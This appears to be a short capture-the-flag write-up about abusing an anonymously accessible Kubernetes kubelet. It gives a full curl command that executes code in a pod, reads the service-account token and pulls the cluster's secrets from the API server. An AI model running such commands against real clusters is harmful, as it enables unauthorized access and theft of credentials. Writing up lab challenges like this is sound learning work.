# Writeup That Day

### Main idea
Can access kubelet anonymously

### How
Exec shell command in one of running pods

### Example
1. Access `secrets` in cluster using `credentials` that available inside pod
2. Using curl will look like this
   ```
   curl -XPOST -k \
   https://foryou.lychnobyte.my.id:10250/run/<namespace>/<pods>/<container> \
   -d 'cmd=curl -s https://foryou.lychnobyte.my.id:16443/api/v1/namespaces/<namespace>/secrets \
              --header "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
              --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
   ```
   or you can simply use `kubeletctl`

### Reference
